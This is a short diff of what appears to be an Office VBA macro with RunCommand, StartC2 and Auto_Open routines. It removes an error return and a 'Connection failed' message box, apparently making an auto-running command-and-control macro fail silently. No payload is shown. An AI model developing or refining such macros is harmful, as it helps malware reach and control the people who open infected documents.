@@ -14,7 +14,6 @@ Done:
         Exit Function
         
 error:
-        RunCommand = "ERROR"
     
 End Function
 Function StartC2()
@@ -40,7 +39,6 @@ Done:
     Exit Function
     
 error:
-    MsgBox ("Connection failed")
 
 End Function
 Sub Auto_Open()
